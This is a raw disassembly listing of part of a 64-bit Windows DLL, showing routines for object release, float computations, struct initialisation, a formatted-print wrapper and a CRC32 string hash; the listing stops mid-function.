   180002d36:	48 8b d9             	mov    %rcx,%rbx
   180002d39:	48 8b 49 38          	mov    0x38(%rcx),%rcx
   180002d3d:	48 85 c9             	test   %rcx,%rcx
   180002d40:	74 19                	je     0x180002d5b
   180002d42:	48 8b 05 87 a0 07 00 	mov    0x7a087(%rip),%rax        # 0x18007cdd0
   180002d49:	48 85 c0             	test   %rax,%rax
   180002d4c:	74 06                	je     0x180002d54
   180002d4e:	ff 88 bc 03 00 00    	decl   0x3bc(%rax)
   180002d54:	ff 15 7e e6 03 00    	call   *0x3e67e(%rip)        # 0x1800413d8
   180002d5a:	90                   	nop
   180002d5b:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   180002d5f:	48 85 c9             	test   %rcx,%rcx
   180002d62:	74 19                	je     0x180002d7d
   180002d64:	48 8b 05 65 a0 07 00 	mov    0x7a065(%rip),%rax        # 0x18007cdd0
   180002d6b:	48 85 c0             	test   %rax,%rax
   180002d6e:	74 06                	je     0x180002d76
   180002d70:	ff 88 bc 03 00 00    	decl   0x3bc(%rax)
   180002d76:	ff 15 5c e6 03 00    	call   *0x3e65c(%rip)        # 0x1800413d8
   180002d7c:	90                   	nop
   180002d7d:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   180002d81:	48 85 c9             	test   %rcx,%rcx
   180002d84:	74 19                	je     0x180002d9f
   180002d86:	48 8b 05 43 a0 07 00 	mov    0x7a043(%rip),%rax        # 0x18007cdd0
   180002d8d:	48 85 c0             	test   %rax,%rax
   180002d90:	74 06                	je     0x180002d98
   180002d92:	ff 88 bc 03 00 00    	decl   0x3bc(%rax)
   180002d98:	ff 15 3a e6 03 00    	call   *0x3e63a(%rip)        # 0x1800413d8
   180002d9e:	90                   	nop
   180002d9f:	48 83 c4 20          	add    $0x20,%rsp
   180002da3:	5b                   	pop    %rbx
   180002da4:	c3                   	ret
   180002da5:	cc                   	int3
   180002da6:	cc                   	int3
   180002da7:	cc                   	int3
   180002da8:	cc                   	int3
   180002da9:	cc                   	int3
   180002daa:	cc                   	int3
   180002dab:	cc                   	int3
   180002dac:	cc                   	int3
   180002dad:	cc                   	int3
   180002dae:	cc                   	int3
   180002daf:	cc                   	int3
   180002db0:	44 8b 49 0c          	mov    0xc(%rcx),%r9d
   180002db4:	0f 57 d2             	xorps  %xmm2,%xmm2
   180002db7:	48 8b 05 12 a0 07 00 	mov    0x7a012(%rip),%rax        # 0x18007cdd0
   180002dbe:	41 f6 c1 01          	test   $0x1,%r9b
   180002dc2:	74 0c                	je     0x180002dd0
   180002dc4:	0f 57 db             	xorps  %xmm3,%xmm3
   180002dc7:	4c 8d 80 94 15 00 00 	lea    0x1594(%rax),%r8
   180002dce:	eb 39                	jmp    0x180002e09
   180002dd0:	4c 8b 81 58 03 00 00 	mov    0x358(%rcx),%r8
   180002dd7:	f3 0f 10 80 14 19 00 	movss  0x1914(%rax),%xmm0
   180002dde:	00 
   180002ddf:	f3 0f 59 81 a0 02 00 	mulss  0x2a0(%rcx),%xmm0
   180002de6:	00 
   180002de7:	4d 85 c0             	test   %r8,%r8
   180002dea:	74 09                	je     0x180002df5
   180002dec:	f3 41 0f 59 80 a0 02 	mulss  0x2a0(%r8),%xmm0
   180002df3:	00 00 
   180002df5:	4c 8d 80 94 15 00 00 	lea    0x1594(%rax),%r8
   180002dfc:	f3 41 0f 10 18       	movss  (%r8),%xmm3
   180002e01:	f3 0f 58 db          	addss  %xmm3,%xmm3
   180002e05:	f3 0f 58 d8          	addss  %xmm0,%xmm3
   180002e09:	f3 0f 58 59 14       	addss  0x14(%rcx),%xmm3
   180002e0e:	41 0f ba e1 0a       	bt     $0xa,%r9d
   180002e13:	73 39                	jae    0x180002e4e
   180002e15:	f3 0f 10 90 14 19 00 	movss  0x1914(%rax),%xmm2
   180002e1c:	00 
   180002e1d:	48 8b 81 58 03 00 00 	mov    0x358(%rcx),%rax
   180002e24:	f3 0f 59 91 a0 02 00 	mulss  0x2a0(%rcx),%xmm2
   180002e2b:	00 
   180002e2c:	48 85 c0             	test   %rax,%rax
   180002e2f:	74 08                	je     0x180002e39
   180002e31:	f3 0f 59 90 a0 02 00 	mulss  0x2a0(%rax),%xmm2
   180002e38:	00 
   180002e39:	f3 41 0f 10 00       	movss  (%r8),%xmm0
   180002e3e:	f3 0f 58 91 50 01 00 	addss  0x150(%rcx),%xmm2
   180002e45:	00 
   180002e46:	f3 0f 58 c0          	addss  %xmm0,%xmm0
   180002e4a:	f3 0f 58 d0          	addss  %xmm0,%xmm2
   180002e4e:	f3 0f 10 41 10       	movss  0x10(%rcx),%xmm0
   180002e53:	f3 0f 58 d3          	addss  %xmm3,%xmm2
   180002e57:	0f 28 c8             	movaps %xmm0,%xmm1
   180002e5a:	48 8b c2             	mov    %rdx,%rax
   180002e5d:	f3 0f 58 49 20       	addss  0x20(%rcx),%xmm1
   180002e62:	f3 0f 11 02          	movss  %xmm0,(%rdx)
   180002e66:	f3 0f 11 5a 04       	movss  %xmm3,0x4(%rdx)
   180002e6b:	f3 0f 11 52 0c       	movss  %xmm2,0xc(%rdx)
   180002e70:	f3 0f 11 4a 08       	movss  %xmm1,0x8(%rdx)
   180002e75:	c3                   	ret
   180002e76:	cc                   	int3
   180002e77:	cc                   	int3
   180002e78:	cc                   	int3
   180002e79:	cc                   	int3
   180002e7a:	cc                   	int3
   180002e7b:	cc                   	int3
   180002e7c:	cc                   	int3
   180002e7d:	cc                   	int3
   180002e7e:	cc                   	int3
   180002e7f:	cc                   	int3
   180002e80:	48 ff 25 49 e5 03 00 	rex.W jmp *0x3e549(%rip)        # 0x1800413d0
   180002e87:	cc                   	int3
   180002e88:	cc                   	int3
   180002e89:	cc                   	int3
   180002e8a:	cc                   	int3
   180002e8b:	cc                   	int3
   180002e8c:	cc                   	int3
   180002e8d:	cc                   	int3
   180002e8e:	cc                   	int3
   180002e8f:	cc                   	int3
   180002e90:	48 ff 25 41 e5 03 00 	rex.W jmp *0x3e541(%rip)        # 0x1800413d8
   180002e97:	cc                   	int3
   180002e98:	cc                   	int3
   180002e99:	cc                   	int3
   180002e9a:	cc                   	int3
   180002e9b:	cc                   	int3
   180002e9c:	cc                   	int3
   180002e9d:	cc                   	int3
   180002e9e:	cc                   	int3
   180002e9f:	cc                   	int3
   180002ea0:	40 53                	rex push %rbx
   180002ea2:	48 83 ec 20          	sub    $0x20,%rsp
   180002ea6:	48 8b d9             	mov    %rcx,%rbx
   180002ea9:	48 8d 81 b0 00 00 00 	lea    0xb0(%rcx),%rax
   180002eb0:	b9 30 00 00 00       	mov    $0x30,%ecx
   180002eb5:	33 d2                	xor    %edx,%edx
   180002eb7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   180002ebe:	00 00 
   180002ec0:	48 89 50 08          	mov    %rdx,0x8(%rax)
   180002ec4:	48 89 10             	mov    %rdx,(%rax)
   180002ec7:	48 8d 40 10          	lea    0x10(%rax),%rax
   180002ecb:	48 83 e9 01          	sub    $0x1,%rcx
   180002ecf:	75 ef                	jne    0x180002ec0
   180002ed1:	48 8b cb             	mov    %rbx,%rcx
   180002ed4:	c7 03 00 00 80 3f    	movl   $0x3f800000,(%rbx)
   180002eda:	c7 43 04 00 00 00 41 	movl   $0x41000000,0x4(%rbx)
   180002ee1:	c7 43 08 00 00 00 41 	movl   $0x41000000,0x8(%rbx)
   180002ee8:	c7 43 0c 00 00 e0 40 	movl   $0x40e00000,0xc(%rbx)
   180002eef:	c7 43 10 00 00 80 3f 	movl   $0x3f800000,0x10(%rbx)
   180002ef6:	c7 43 14 00 00 00 42 	movl   $0x42000000,0x14(%rbx)
   180002efd:	48 c7 43 18 00 00 00 	movq   $0x42000000,0x18(%rbx)
   180002f04:	42 
   180002f05:	48 c7 43 20 00 00 00 	movq   $0x3f000000,0x20(%rbx)
   180002f0c:	3f 
   180002f0d:	89 53 28             	mov    %edx,0x28(%rbx)
   180002f10:	48 c7 43 2c 00 00 80 	movq   $0x3f800000,0x2c(%rbx)
   180002f17:	3f 
   180002f18:	c7 43 34 00 00 80 3f 	movl   $0x3f800000,0x34(%rbx)
   180002f1f:	c7 43 38 00 00 80 40 	movl   $0x40800000,0x38(%rbx)
   180002f26:	48 c7 43 3c 00 00 40 	movq   $0x40400000,0x3c(%rbx)
   180002f2d:	40 
   180002f2e:	89 53 44             	mov    %edx,0x44(%rbx)
   180002f31:	c7 43 48 00 00 00 41 	movl   $0x41000000,0x48(%rbx)
   180002f38:	c7 43 4c 00 00 80 40 	movl   $0x40800000,0x4c(%rbx)
   180002f3f:	c7 43 50 00 00 80 40 	movl   $0x40800000,0x50(%rbx)
   180002f46:	48 c7 43 54 00 00 80 	movq   $0x40800000,0x54(%rbx)
   180002f4d:	40 
   180002f4e:	89 53 5c             	mov    %edx,0x5c(%rbx)
   180002f51:	c7 43 60 00 00 a8 41 	movl   $0x41a80000,0x60(%rbx)
   180002f58:	c7 43 64 00 00 c0 40 	movl   $0x40c00000,0x64(%rbx)
   180002f5f:	c7 43 68 00 00 60 41 	movl   $0x41600000,0x68(%rbx)
   180002f66:	c7 43 6c 00 00 10 41 	movl   $0x41100000,0x6c(%rbx)
   180002f6d:	48 c7 43 70 00 00 20 	movq   $0x41200000,0x70(%rbx)
   180002f74:	41 
   180002f75:	48 c7 43 78 00 00 80 	movq   $0x40800000,0x78(%rbx)
   180002f7c:	40 
   180002f7d:	c7 83 80 00 00 00 01 	movl   $0x1,0x80(%rbx)
   180002f84:	00 00 00 
   180002f87:	c7 83 84 00 00 00 00 	movl   $0x3f000000,0x84(%rbx)
   180002f8e:	00 00 3f 
   180002f91:	48 c7 83 88 00 00 00 	movq   $0x3f000000,0x88(%rbx)
   180002f98:	00 00 00 3f 
   180002f9c:	89 93 90 00 00 00    	mov    %edx,0x90(%rbx)
   180002fa2:	c7 83 94 00 00 00 00 	movl   $0x41980000,0x94(%rbx)
   180002fa9:	00 98 41 
   180002fac:	c7 83 98 00 00 00 00 	movl   $0x41980000,0x98(%rbx)
   180002fb3:	00 98 41 
   180002fb6:	c7 83 9c 00 00 00 00 	movl   $0x40400000,0x9c(%rbx)
   180002fbd:	00 40 40 
   180002fc0:	c7 83 a0 00 00 00 00 	movl   $0x40400000,0xa0(%rbx)
   180002fc7:	00 40 40 
   180002fca:	c7 83 a4 00 00 00 00 	movl   $0x3f800000,0xa4(%rbx)
   180002fd1:	00 80 3f 
   180002fd4:	66 c7 83 a8 00 00 00 	movw   $0x101,0xa8(%rbx)
   180002fdb:	01 01 
   180002fdd:	c7 83 ac 00 00 00 00 	movl   $0x3fa00000,0xac(%rbx)
   180002fe4:	00 a0 3f 
   180002fe7:	e8 c4 c6 01 00       	call   0x18001f6b0
   180002fec:	48 8b c3             	mov    %rbx,%rax
   180002fef:	48 83 c4 20          	add    $0x20,%rsp
   180002ff3:	5b                   	pop    %rbx
   180002ff4:	c3                   	ret
   180002ff5:	cc                   	int3
   180002ff6:	cc                   	int3
   180002ff7:	cc                   	int3
   180002ff8:	cc                   	int3
   180002ff9:	cc                   	int3
   180002ffa:	cc                   	int3
   180002ffb:	cc                   	int3
   180002ffc:	cc                   	int3
   180002ffd:	cc                   	int3
   180002ffe:	cc                   	int3
   180002fff:	cc                   	int3
   180003000:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180003005:	57                   	push   %rdi
   180003006:	48 83 ec 20          	sub    $0x20,%rsp
   18000300a:	33 ff                	xor    %edi,%edi
   18000300c:	33 d2                	xor    %edx,%edx
   18000300e:	48 89 b9 b8 03 00 00 	mov    %rdi,0x3b8(%rcx)
   180003015:	41 b8 50 15 00 00    	mov    $0x1550,%r8d
   18000301b:	48 89 b9 c8 03 00 00 	mov    %rdi,0x3c8(%rcx)
   180003022:	48 8b d9             	mov    %rcx,%rbx
   180003025:	48 89 b9 d0 03 00 00 	mov    %rdi,0x3d0(%rcx)
   18000302c:	48 89 b9 d8 03 00 00 	mov    %rdi,0x3d8(%rcx)
   180003033:	48 89 b9 e0 03 00 00 	mov    %rdi,0x3e0(%rcx)
   18000303a:	48 89 b9 e8 03 00 00 	mov    %rdi,0x3e8(%rcx)
   180003041:	48 89 b9 5c 04 00 00 	mov    %rdi,0x45c(%rcx)
   180003048:	48 89 b9 64 04 00 00 	mov    %rdi,0x464(%rcx)
   18000304f:	48 89 b9 6c 04 00 00 	mov    %rdi,0x46c(%rcx)
   180003056:	48 89 b9 74 04 00 00 	mov    %rdi,0x474(%rcx)
   18000305d:	48 89 b9 7c 04 00 00 	mov    %rdi,0x47c(%rcx)
   180003064:	48 89 b9 40 15 00 00 	mov    %rdi,0x1540(%rcx)
   18000306b:	48 89 b9 48 15 00 00 	mov    %rdi,0x1548(%rcx)
   180003072:	e8 fd ca 03 00       	call   0x18003fb74
   180003077:	48 89 3b             	mov    %rdi,(%rbx)
   18000307a:	48 8d 05 5f e8 03 00 	lea    0x3e85f(%rip),%rax        # 0x1800418e0
   180003081:	48 89 43 18          	mov    %rax,0x18(%rbx)
   180003085:	48 8d 05 64 e8 03 00 	lea    0x3e864(%rip),%rax        # 0x1800418f0
   18000308c:	48 89 43 20          	mov    %rax,0x20(%rbx)
   180003090:	48 8d 05 09 3a 01 00 	lea    0x13a09(%rip),%rax        # 0x180016aa0
   180003097:	c7 43 08 00 00 80 bf 	movl   $0xbf800000,0x8(%rbx)
   18000309e:	c7 43 0c 00 00 80 bf 	movl   $0xbf800000,0xc(%rbx)
   1800030a5:	c7 43 10 89 88 88 3c 	movl   $0x3c888889,0x10(%rbx)
   1800030ac:	c7 43 14 00 00 a0 40 	movl   $0x40a00000,0x14(%rbx)
   1800030b3:	c7 43 28 9a 99 99 3e 	movl   $0x3e99999a,0x28(%rbx)
   1800030ba:	c7 43 2c 00 00 c0 40 	movl   $0x40c00000,0x2c(%rbx)
   1800030c1:	48 c7 43 34 ff ff ff 	movq   $0xffffffffffffffff,0x34(%rbx)
   1800030c8:	ff 
   1800030c9:	48 c7 43 3c ff ff ff 	movq   $0xffffffffffffffff,0x3c(%rbx)
   1800030d0:	ff 
   1800030d1:	48 c7 43 44 ff ff ff 	movq   $0xffffffffffffffff,0x44(%rbx)
   1800030d8:	ff 
   1800030d9:	48 c7 43 4c ff ff ff 	movq   $0xffffffffffffffff,0x4c(%rbx)
   1800030e0:	ff 
   1800030e1:	48 c7 43 54 ff ff ff 	movq   $0xffffffffffffffff,0x54(%rbx)
   1800030e8:	ff 
   1800030e9:	48 c7 43 5c ff ff ff 	movq   $0xffffffffffffffff,0x5c(%rbx)
   1800030f0:	ff 
   1800030f1:	48 c7 43 64 ff ff ff 	movq   $0xffffffffffffffff,0x64(%rbx)
   1800030f8:	ff 
   1800030f9:	48 c7 43 6c ff ff ff 	movq   $0xffffffffffffffff,0x6c(%rbx)
   180003100:	ff 
   180003101:	48 c7 43 74 ff ff ff 	movq   $0xffffffffffffffff,0x74(%rbx)
   180003108:	ff 
   180003109:	48 c7 43 7c ff ff ff 	movq   $0xffffffffffffffff,0x7c(%rbx)
   180003110:	ff 
   180003111:	48 c7 83 84 00 00 00 	movq   $0xffffffffffffffff,0x84(%rbx)
   180003118:	ff ff ff ff 
   18000311c:	48 89 83 f8 00 00 00 	mov    %rax,0xf8(%rbx)
   180003123:	48 8d 05 c6 3b 01 00 	lea    0x13bc6(%rip),%rax        # 0x180016cf0
   18000312a:	48 89 83 00 01 00 00 	mov    %rax,0x100(%rbx)
   180003131:	48 8d 05 e8 3c 01 00 	lea    0x13ce8(%rip),%rax        # 0x180016e20
   180003138:	48 89 83 10 01 00 00 	mov    %rax,0x110(%rbx)
   18000313f:	c7 83 8c 00 00 00 cd 	movl   $0x3e8ccccd,0x8c(%rbx)
   180003146:	cc 8c 3e 
   180003149:	c7 83 90 00 00 00 cd 	movl   $0x3d4ccccd,0x90(%rbx)
   180003150:	cc 4c 3d 
   180003153:	48 89 bb 98 00 00 00 	mov    %rdi,0x98(%rbx)
   18000315a:	48 89 bb a0 00 00 00 	mov    %rdi,0xa0(%rbx)
   180003161:	c7 83 a8 00 00 00 00 	movl   $0x3f800000,0xa8(%rbx)
   180003168:	00 80 3f 
   18000316b:	48 89 bb b0 00 00 00 	mov    %rdi,0xb0(%rbx)
   180003172:	40 88 bb ac 00 00 00 	mov    %dil,0xac(%rbx)
   180003179:	c7 83 b8 00 00 00 00 	movl   $0x3f800000,0xb8(%rbx)
   180003180:	00 80 3f 
   180003183:	c7 83 bc 00 00 00 00 	movl   $0x3f800000,0xbc(%rbx)
   18000318a:	00 80 3f 
   18000318d:	c7 83 c0 00 00 00 00 	movl   $0x1010000,0xc0(%rbx)
   180003194:	00 01 01 
   180003197:	40 88 bb c4 00 00 00 	mov    %dil,0xc4(%rbx)
   18000319e:	c7 83 c8 00 00 00 00 	movl   $0x42700000,0xc8(%rbx)
   1800031a5:	00 70 42 
   1800031a8:	48 89 bb d8 00 00 00 	mov    %rdi,0xd8(%rbx)
   1800031af:	48 89 bb d0 00 00 00 	mov    %rdi,0xd0(%rbx)
   1800031b6:	48 89 bb f0 00 00 00 	mov    %rdi,0xf0(%rbx)
   1800031bd:	48 89 bb e8 00 00 00 	mov    %rdi,0xe8(%rbx)
   1800031c4:	48 89 bb e0 00 00 00 	mov    %rdi,0xe0(%rbx)
   1800031cb:	48 89 bb 08 01 00 00 	mov    %rdi,0x108(%rbx)
   1800031d2:	48 89 bb 18 01 00 00 	mov    %rdi,0x118(%rbx)
   1800031d9:	48 89 bb 20 01 00 00 	mov    %rdi,0x120(%rbx)
   1800031e0:	c7 83 28 01 00 00 ff 	movl   $0xff7fffff,0x128(%rbx)
   1800031e7:	ff 7f ff 
   1800031ea:	c7 83 2c 01 00 00 ff 	movl   $0xff7fffff,0x12c(%rbx)
   1800031f1:	ff 7f ff 
   1800031f4:	c7 83 c0 03 00 00 ff 	movl   $0xff7fffff,0x3c0(%rbx)
   1800031fb:	ff 7f ff 
   1800031fe:	c7 83 c4 03 00 00 ff 	movl   $0xff7fffff,0x3c4(%rbx)
   180003205:	ff 7f ff 
   180003208:	c7 43 30 00 00 c0 40 	movl   $0x40c00000,0x30(%rbx)
   18000320f:	c7 83 48 04 00 00 00 	movl   $0xbf800000,0x448(%rbx)
   180003216:	00 80 bf 
   180003219:	c7 83 34 04 00 00 00 	movl   $0xbf800000,0x434(%rbx)
   180003220:	00 80 bf 
   180003223:	c7 83 4c 04 00 00 00 	movl   $0xbf800000,0x44c(%rbx)
   18000322a:	00 80 bf 
   18000322d:	c7 83 38 04 00 00 00 	movl   $0xbf800000,0x438(%rbx)
   180003234:	00 80 bf 
   180003237:	c7 83 50 04 00 00 00 	movl   $0xbf800000,0x450(%rbx)
   18000323e:	00 80 bf 
   180003241:	c7 83 3c 04 00 00 00 	movl   $0xbf800000,0x43c(%rbx)
   180003248:	00 80 bf 
   18000324b:	c7 83 54 04 00 00 00 	movl   $0xbf800000,0x454(%rbx)
   180003252:	00 80 bf 
   180003255:	c7 83 40 04 00 00 00 	movl   $0xbf800000,0x440(%rbx)
   18000325c:	00 80 bf 
   18000325f:	c7 83 58 04 00 00 00 	movl   $0xbf800000,0x458(%rbx)
   180003266:	00 80 bf 
   180003269:	c7 83 44 04 00 00 00 	movl   $0xbf800000,0x444(%rbx)
   180003270:	00 80 bf 
   180003273:	48 8d 83 98 04 00 00 	lea    0x498(%rbx),%rax
   18000327a:	b9 00 02 00 00       	mov    $0x200,%ecx
   18000327f:	90                   	nop
   180003280:	c7 80 00 08 00 00 00 	movl   $0xbf800000,0x800(%rax)
   180003287:	00 80 bf 
   18000328a:	c7 00 00 00 80 bf    	movl   $0xbf800000,(%rax)
   180003290:	48 8d 40 04          	lea    0x4(%rax),%rax
   180003294:	48 83 e9 01          	sub    $0x1,%rcx
   180003298:	75 e6                	jne    0x180003280
   18000329a:	c7 83 98 14 00 00 00 	movl   $0xbf800000,0x1498(%rbx)
   1800032a1:	00 80 bf 
   1800032a4:	48 8b c3             	mov    %rbx,%rax
   1800032a7:	c7 83 9c 14 00 00 00 	movl   $0xbf800000,0x149c(%rbx)
   1800032ae:	00 80 bf 
   1800032b1:	c7 83 a0 14 00 00 00 	movl   $0xbf800000,0x14a0(%rbx)
   1800032b8:	00 80 bf 
   1800032bb:	c7 83 a4 14 00 00 00 	movl   $0xbf800000,0x14a4(%rbx)
   1800032c2:	00 80 bf 
   1800032c5:	c7 83 a8 14 00 00 00 	movl   $0xbf800000,0x14a8(%rbx)
   1800032cc:	00 80 bf 
   1800032cf:	c7 83 ac 14 00 00 00 	movl   $0xbf800000,0x14ac(%rbx)
   1800032d6:	00 80 bf 
   1800032d9:	c7 83 b0 14 00 00 00 	movl   $0xbf800000,0x14b0(%rbx)
   1800032e0:	00 80 bf 
   1800032e3:	c7 83 b4 14 00 00 00 	movl   $0xbf800000,0x14b4(%rbx)
   1800032ea:	00 80 bf 
   1800032ed:	c7 83 b8 14 00 00 00 	movl   $0xbf800000,0x14b8(%rbx)
   1800032f4:	00 80 bf 
   1800032f7:	c7 83 bc 14 00 00 00 	movl   $0xbf800000,0x14bc(%rbx)
   1800032fe:	00 80 bf 
   180003301:	c7 83 c0 14 00 00 00 	movl   $0xbf800000,0x14c0(%rbx)
   180003308:	00 80 bf 
   18000330b:	c7 83 c4 14 00 00 00 	movl   $0xbf800000,0x14c4(%rbx)
   180003312:	00 80 bf 
   180003315:	c7 83 c8 14 00 00 00 	movl   $0xbf800000,0x14c8(%rbx)
   18000331c:	00 80 bf 
   18000331f:	c7 83 cc 14 00 00 00 	movl   $0xbf800000,0x14cc(%rbx)
   180003326:	00 80 bf 
   180003329:	c7 83 d0 14 00 00 00 	movl   $0xbf800000,0x14d0(%rbx)
   180003330:	00 80 bf 
   180003333:	c7 83 d4 14 00 00 00 	movl   $0xbf800000,0x14d4(%rbx)
   18000333a:	00 80 bf 
   18000333d:	c7 83 d8 14 00 00 00 	movl   $0xbf800000,0x14d8(%rbx)
   180003344:	00 80 bf 
   180003347:	c7 83 dc 14 00 00 00 	movl   $0xbf800000,0x14dc(%rbx)
   18000334e:	00 80 bf 
   180003351:	c7 83 e0 14 00 00 00 	movl   $0xbf800000,0x14e0(%rbx)
   180003358:	00 80 bf 
   18000335b:	c7 83 e4 14 00 00 00 	movl   $0xbf800000,0x14e4(%rbx)
   180003362:	00 80 bf 
   180003365:	c7 83 e8 14 00 00 00 	movl   $0xbf800000,0x14e8(%rbx)
   18000336c:	00 80 bf 
   18000336f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180003374:	48 83 c4 20          	add    $0x20,%rsp
   180003378:	5f                   	pop    %rdi
   180003379:	c3                   	ret
   18000337a:	cc                   	int3
   18000337b:	cc                   	int3
   18000337c:	cc                   	int3
   18000337d:	cc                   	int3
   18000337e:	cc                   	int3
   18000337f:	cc                   	int3
   180003380:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   180003385:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   18000338a:	53                   	push   %rbx
   18000338b:	55                   	push   %rbp
   18000338c:	56                   	push   %rsi
   18000338d:	57                   	push   %rdi
   18000338e:	48 83 ec 38          	sub    $0x38,%rsp
   180003392:	49 8b d8             	mov    %r8,%rbx
   180003395:	48 8d 6c 24 78       	lea    0x78(%rsp),%rbp
   18000339a:	48 8b fa             	mov    %rdx,%rdi
   18000339d:	48 8b f1             	mov    %rcx,%rsi
   1800033a0:	e8 eb ef ff ff       	call   0x180002390
   1800033a5:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
   1800033aa:	4c 8b cb             	mov    %rbx,%r9
   1800033ad:	4c 8b c7             	mov    %rdi,%r8
   1800033b0:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1800033b7:	00 00 
   1800033b9:	48 8b d6             	mov    %rsi,%rdx
   1800033bc:	48 8b 08             	mov    (%rax),%rcx
   1800033bf:	48 83 c9 01          	or     $0x1,%rcx
   1800033c3:	ff 15 f7 e0 03 00    	call   *0x3e0f7(%rip)        # 0x1800414c0
   1800033c9:	8b c8                	mov    %eax,%ecx
   1800033cb:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1800033d0:	85 c9                	test   %ecx,%ecx
   1800033d2:	0f 48 c8             	cmovs  %eax,%ecx
   1800033d5:	48 85 f6             	test   %rsi,%rsi
   1800033d8:	74 12                	je     0x1800033ec
   1800033da:	3b c8                	cmp    %eax,%ecx
   1800033dc:	74 04                	je     0x1800033e2
   1800033de:	3b cf                	cmp    %edi,%ecx
   1800033e0:	7c 03                	jl     0x1800033e5
   1800033e2:	8d 4f ff             	lea    -0x1(%rdi),%ecx
   1800033e5:	48 63 c1             	movslq %ecx,%rax
   1800033e8:	c6 04 30 00          	movb   $0x0,(%rax,%rsi,1)
   1800033ec:	8b c1                	mov    %ecx,%eax
   1800033ee:	48 83 c4 38          	add    $0x38,%rsp
   1800033f2:	5f                   	pop    %rdi
   1800033f3:	5e                   	pop    %rsi
   1800033f4:	5d                   	pop    %rbp
   1800033f5:	5b                   	pop    %rbx
   1800033f6:	c3                   	ret
   1800033f7:	cc                   	int3
   1800033f8:	cc                   	int3
   1800033f9:	cc                   	int3
   1800033fa:	cc                   	int3
   1800033fb:	cc                   	int3
   1800033fc:	cc                   	int3
   1800033fd:	cc                   	int3
   1800033fe:	cc                   	int3
   1800033ff:	cc                   	int3
   180003400:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180003405:	45 8b d8             	mov    %r8d,%r11d
   180003408:	4c 8b d2             	mov    %rdx,%r10
   18000340b:	41 f7 d3             	not    %r11d
   18000340e:	4c 8b c9             	mov    %rcx,%r9
   180003411:	41 8b c3             	mov    %r11d,%eax
   180003414:	48 85 d2             	test   %rdx,%rdx
   180003417:	74 44                	je     0x18000345d
   180003419:	48 8d 1d 50 11 04 00 	lea    0x41150(%rip),%rbx        # 0x180044570
   180003420:	45 0f b6 01          	movzbl (%r9),%r8d
   180003424:	4d 8d 49 01          	lea    0x1(%r9),%r9
   180003428:	49 ff ca             	dec    %r10
   18000342b:	41 80 f8 23          	cmp    $0x23,%r8b
   18000342f:	75 13                	jne    0x180003444
   180003431:	49 83 fa 02          	cmp    $0x2,%r10
   180003435:	72 0d                	jb     0x180003444
   180003437:	45 38 01             	cmp    %r8b,(%r9)
   18000343a:	75 08                	jne    0x180003444
   18000343c:	45 38 41 01          	cmp    %r8b,0x1(%r9)
   180003440:	41 0f 44 c3          	cmove  %r11d,%eax
   180003444:	0f b6 d0             	movzbl %al,%edx
   180003447:	49 33 d0             	xor    %r8,%rdx
   18000344a:	c1 e8 08             	shr    $0x8,%eax
   18000344d:	33 04 93             	xor    (%rbx,%rdx,4),%eax
   180003450:	4d 85 d2             	test   %r10,%r10
   180003453:	75 cb                	jne    0x180003420
   180003455:	f7 d0                	not    %eax
   180003457:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   18000345c:	c3                   	ret
   18000345d:	44 0f b6 11          	movzbl (%rcx),%r10d
   180003461:	4c 8d 41 01          	lea    0x1(%rcx),%r8
   180003465:	45 84 d2             	test   %r10b,%r10b
   180003468:	74 36                	je     0x1800034a0
   18000346a:	48 8d 1d ff 10 04 00 	lea    0x410ff(%rip),%rbx        # 0x180044570
   180003471:	41 80 fa 23          	cmp    $0x23,%r10b
   180003475:	75 0d                	jne    0x180003484
   180003477:	45 38 10             	cmp    %r10b,(%r8)
   18000347a:	75 08                	jne    0x180003484
   18000347c:	45 38 50 01          	cmp    %r10b,0x1(%r8)
   180003480:	41 0f 44 c3          	cmove  %r11d,%eax
   180003484:	0f b6 d0             	movzbl %al,%edx
   180003487:	41 0f b6 ca          	movzbl %r10b,%ecx
   18000348b:	45 0f b6 10          	movzbl (%r8),%r10d
   18000348f:	48 33 d1             	xor    %rcx,%rdx
   180003492:	c1 e8 08             	shr    $0x8,%eax
   180003495:	49 ff c0             	inc    %r8
   180003498:	33 04 93             	xor    (%rbx,%rdx,4),%eax
   18000349b:	45 84 d2             	test   %r10b,%r10b
   18000349e:	75 d1                	jne    0x180003471
   1800034a0:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   1800034a5:	f7 d0                	not    %eax
   1800034a7:	c3                   	ret
   1800034a8:	cc                   	int3
   1800034a9:	cc                   	int3
   1800034aa:	cc                   	int3
   1800034ab:	cc                   	int3
   1800034ac:	cc                   	int3
   1800034ad:	cc                   	int3
   1800034ae:	cc                   	int3
   1800034af:	cc                   	int3
   1800034b0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1800034b5:	55                   	push   %rbp
   1800034b6:	56                   	push   %rsi
   1800034b7:	57                   	push   %rdi
   1800034b8:	41 54                	push   %r12
   1800034ba:	41 55                	push   %r13
   1800034bc:	41 56                	push   %r14
   1800034be:	41 57                	push   %r15
   1800034c0:	48 83 ec 30          	sub    $0x30,%rsp
   1800034c4:	48 8b ea             	mov    %rdx,%rbp
   1800034c7:	48 8b f1             	mov    %rcx,%rsi
   1800034ca:	48 8b d9             	mov    %rcx,%rbx
   1800034cd:	45 33 f6             	xor    %r14d,%r14d
   1800034d0:	41 8b fe             	mov    %r14d,%edi
   1800034d3:	40 38 39             	cmp    %dil,(%rcx)
   1800034d6:	74 34                	je     0x18000350c
   1800034d8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1800034df:	00 
   1800034e0:	45 33 c0             	xor    %r8d,%r8d
   1800034e3:	48 8b d3             	mov    %rbx,%rdx
   1800034e6:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1800034eb:	e8 80 03 00 00       	call   0x180003870
   1800034f0:	48 63 c8             	movslq %eax,%rcx
   1800034f3:	48 03 d9             	add    %rcx,%rbx
